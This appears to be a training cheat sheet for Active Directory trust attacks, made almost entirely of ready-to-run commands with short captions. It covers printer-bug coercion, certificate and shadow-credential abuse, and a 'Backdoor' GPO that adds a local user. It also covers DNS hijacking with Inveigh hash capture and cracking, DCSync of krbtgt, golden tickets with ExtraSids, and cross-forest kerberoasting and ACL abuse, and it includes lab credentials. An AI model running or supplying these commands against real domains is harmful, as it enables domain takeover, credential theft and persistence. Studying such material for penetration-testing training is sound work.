title: Active Directory Trust Attacks
html:
Active Directory Trust Attacks

Enumeration & Mapping

Load the Active Directory (AD) PowerShell module.

Import-Module activedirectory

Enumerate Active Directory trusts for current domain using the built-in AD PowerShell module.

Get-ADTrust -Filter *

Enumerate trusts for the current domain using PowerView.

Get-DomainTrust

Enumerate all trusts for the current domain along with all trusts for each domain that is found in the process.

Get-DomainTrustMapping

Using the Adalanche tool to map Active Directory.

.\Adalanche.exe collect activedirectory --domain <domain-name>.ad

Query in Adalanche GUI to view all trusts within the collected data.

(objectClass=trustedDomain)

Intra Forest Attacks

Monitor Kerberos tickets using Rubeus.

.\Rubeus.exe monitor /interval:5 /nowrap

Abusing the Printer Bug flaw.

.\SpoolSample.exe dc01.<domain-name>.ad dc02.dev.<domain-name>.ad

Obtaining a valid TGT ticket in memory using the renew option in Rubeus.

.\Rubeus.exe renew /ticket:doIFvDCCBbigAwIBQNUp/nYxdZNM8CtNv...SNIP... /ptt

Enumerate ACL's for WRITE access on Configuration Naming Context.

$dn = "CN=Configuration,DC=<domain-name>,DC=AD"
$acl = Get-Acl -Path "AD:\$dn"
$acl.Access | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|Write" }

Request a ticket using Certify.

.\Certify.exe request /ca:<domain-name>.ad\<domain-name>-<dc-hostname>-CA /domain:<domain-name>.ad /template:"Copy of User" /altname:<domain-name>\Administrator

Request a TGT ticket.

.\Rubeus.exe asktgt /domain:<domain-name>.ad /user:Administrator /certificate:cert.pfx /ptt

Create new GPO.

$gpo = "Backdoor"
New-GPO $gpo

Create a scheduled task inside a GPO that adds a new user.

New-GPOImmediateTask -Verbose -Force -TaskName 'Backdoor' -GPODisplayName "Backdoor" -Command C:\Windows\System32\cmd.exe -CommandArguments "/c net user backdoor B@ckdoor123 /add"

Retrieve the replication site of the root domain controller.

Get-ADDomainController -Server <domain-name>.ad | Select ServerObjectDN

Link the GPO to the default site as SYSTEM.

$sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=<domain-name>,DC=AD"
New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.<domain-name>.ad

Create new gMSA account.

New-ADServiceAccount -Name "apache-dev" -DNSHostName "<domain-name>.ad" -PrincipalsAllowedToRetrieveManagedPassword htb-student-1 -Enabled $True

Enumerate gMSA.

.\GoldenGMSA.exe gmsainfo --domain <domain-name>.ad

Retrieve gMSA password.

\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --forest dev.<domain-name>.ad --domain <domain-name>.ad

Retrieve msds-ManagedPasswordID.

.\GoldenGMSA.exe gmsainfo --domain <domain-name>.ad

Retrieve kdsinfo.

.\GoldenGMSA.exe kdsinfo --forest dev.<domain-name>.ad

Compute the gMSA Password Manually.

.\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --kdskey AQAAAAwsk<SNIP>

Convert password to NT hash.

import base64

import hashlib


`base64_input  = "WITSKRtGah<SNIP>=`"


print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())

Resolve non-existing DNS Name.

Resolve-DNSName TEST1.<domain-name>.ad

Add wildcard DNS record.

Import-module Powermad.ps1
New-ADIDNSNode -Node * -domainController <dc-hostname>.<domain-name>.ad -Domain <domain-name>.ad -Zone <domain-name>.ad -Tombstone -Verbose

Enumerate DNS records in parent domain.

Get-DnsServerResourceRecord -ComputerName <dc-hostname>.<domain-name>.ad -ZoneName <domain-name>.ad -Name "@"

Enumerate DNS Record for DEV01

Resolve-DnsName -Name DEV01.<domain-name>.ad -Server <dc-hostname>.<domain-name>.AD

Modify DNS Record for DEV01.

$Old = Get-DnsServerResourceRecord -ComputerName <dc-hostname>.<domain-name>.AD -ZoneName <domain-name>.ad -Name DEV01

$New = $Old.Clone()

$TTL = [System.TimeSpan]::FromSeconds(1)

$New.TimeToLive = $TTL

$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('172.16.210.3')

Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName <dc-hostname>.<domain-name>.AD -ZoneName <domain-name>.ad

Get-DnsServerResourceRecord -ComputerName <dc-hostname>.<domain-name>.ad -ZoneName <domain-name>.ad -Name "@"

Verify the IP change for DEV01.

Resolve-DnsName -Name DEV01.<domain-name>.ad -Server <dc-hostname>.<domain-name>.AD

Start Inveigh for hash interception.

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y

Crack NTLMv2 hash with Hashcat.

hashcat -m 5600 buster_ntlmv2 /usr/share/wordlists/rockyou.txt

Enumerate users that belong to groups within the parent domain.

Get-DomainForeignUser

Gather additional info on the Inlanefreight_admins group.

Get-DomainGroup -Identity 'Inlanefreight_admins' -domain <domain-name>.ad

Create a sacrificial logon session with Rubeus.

./Rubeus createnetonly /program:powershell.exe /show

Create a new domain user in parent domain.

Import-Module .\PowerView.ps1

$SecPassword = ConvertTo-SecureString 'T3st@123' -AsPlainText -Force

New-DomainUser -Domain <domain-name>.ad -SamAccountName testuser -AccountPassword $SecPassword

Add the created user into DNSAdmins Group.

Add-ADGroupMember -identity "DNSAdmins" -Members testuser -Server <domain-name>.ad

Enumerate ACLs for Rita.

$sid = Convert-NameToSid rita

Get-DomainObjectAcl -ResolveGUIDs -Identity * -domain <domain-name>.ad &#124 ? {$_.SecurityIdentifier -eq $sid}

Add Rita to Infrastructure group.

Add-DomainGroupMember -identity 'Infrastructure' -Members 'DEV\rita' -Domain <domain-name>.ad -Verbose

Confirm group membership.

Get-DomainGroupMember -Identity 'Infrastructure' -Domain <domain-name>.ad -Verbose

Enumerate Foreign ACLs for all users.

$Domain = "<domain-name>.ad"
$DomainSid = Get-DomainSid $Domain
Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity  | ? { 
    `($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and` \`
    `($_.AceType -match 'AccessAllowed') -and` \`
    `($_.SecurityIdentifier -match '^S-1-5-.-[1-9]\d{3,}$') -and` \`
    `($_.SecurityIdentifier -notmatch $DomainSid)`
}

Convert SID to username with PowerView.

ConvertFrom-SID S-1-5-21-2901893446-2198612369-2488268719-2103

Add credentials on the msDS-KeyCredentialLink attribute.

.\Whisker.exe add /target:<dc-hostname>$ /domain:<domain-name>.ad

Perform S4U2self request to impersonate the Administrator account.

.\Rubeus.exe s4u /dc:<dc-hostname>.<domain-name>.ad /ticket:dot0YBOM<SNIP>== /impersonateuser:administrator@<domain-name>.ad /ptt /self /service:host/<dc-hostname>.<domain-name>.ad /altservice:cifs/<dc-hostname>.<domain-name>.ad

Obtain KRBTGT hash for the child domain.

.\mimikatz.exe "lsadump::dcsync /user:DEV\krbtgt" exit

Obtain SID of domain.

Get-DomainSID

Obtain Enterprise Admins SID from parent domain.

Get-ADGroup -Identity "Enterprise Admins" -Server "<domain-name>.ad"

Create Golden Ticket using Rubeus.

.\Rubeus.exe golden /rc4:992093609707726257e0959ce3e23771 /domain:dev.<domain-name>.ad /sid:S-1-5-21-2901893446-2198612369-2488268719 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /user:Administrator /ptt

Create Golden Ticket using Mimikatz.

mimikatz # kerberos::golden /user:htb-student /domain:dev.<domain-name>.ad  /sid:S-1-5-21-2901893446-2198612369-2488268719 /krbtgt:992093609707726257e0959ce3e23771 /sids:S-1-5-21-2879935145-656083549-3766571964-519 /ptt

Verify ticket in memory.

klist

Obtain KRBTGT hash for the child domain using Secretsdump.py.

secretsdump.py dev.<domain-name>.ad/Administrator:'HTB_@cademy_adm!'@<target-ip> -just-dc-user DEV/krbtgt

Obtain SID of domain using lookupsid.py.

lookupsid.py dev.<domain-name>.ad/Administrator:'HTB_@cademy_adm!'@<target-ip>  | grep "Domain SID"

Create Golden Ticket using ticketer.py.

`ticketer.py -nthash 992093609707726257e0959ce3e23771 -domain dev.inlanefreight.ad -domain-sid S-1-5-21-2901893446-2198612369-2488268719 -extra-sid S-1-5-21-2879935145-656083549-3766571964-519 htb-student`.

Automating the ExtraSids attack using raisechild.py.

`raiseChild.py -target-exe 172.16.210.99 dev.<domain-name>.ad/htb-student`F

Cross Forest Attacks

Kerberoast across forest trust.

.\Rubeus.exe kerberoast /domain:logistics.ad

Enumerate users with SIDHistory enabled.

Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory

Create a sacrificial login session with Rubeus.

./Rubeus createnetonly /program:powershell.exe /show

Retrieve only TrustAttributes for domain.

Get-DomainTrust -domain logistics.ad  | Where-Object {$_.TargetName -eq "<domain-name>.ad"}  | Select TrustAttributes

Obtain KRBTGT hash for the current domain.

.\mimikatz.exe "lsadump::dcsync /user:<domain-name>\krbtgt" exit

Parse data from msDS-TrustForestTrustInfo.

python3 ftinfo.py

Get LocalSid for SQL server.

proxychains python getlocalsid.py <domain-name>.ad/Administrator@SQL02.logistics.ad SQL02

Get GUID for target domain.

Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' | select name,objectguid

Retrieve Inter-realm tickets.

.\mimikatz.exe "lsadump::dcsync /guid:{8d52f9da-361b-4dc3-8fa7-af5f282fa741}" "exit"

Enumerate SQL Server links.

Get-SQLServerLink

Enumerate login rights for user.

Get-SQLQuery  -Query "EXEC sp_helplinkedsrvlogin"

Connect to SQL Server using Impacket tools.

mssqlclient.py jimmy@<target-ip> -windows-auth

Enumerate foreign security principals.

Get-DomainObject -LDAPFilter '(objectclass=ForeignSecurityPrincipal)' -Domain logistics.ad

Enumerate foreign ACL principals.

Get-DomainObjectAcl -ResolveGUIDs -Identity * -domain logistics.ad  | ? {$_.SecurityIdentifier -eq $sid}

Abuse foreign ACL principals.

Set-DomainUserPassword -identity jessica -AccountPassword $pass -domain logistics.ad -verbose

Create shadow principal in bastion forest.

Set-ADObject -Identity "CN=Tom,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=controlcenter,DC=corp" -Add @{'member'="CN=Administrator,CN=Users,DC=controlcenter,DC=corp"} -Verbose

Enumerate shadow principals.

Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter  -Properties   | select Name,member,msDS-ShadowPrincipalSid  | fl
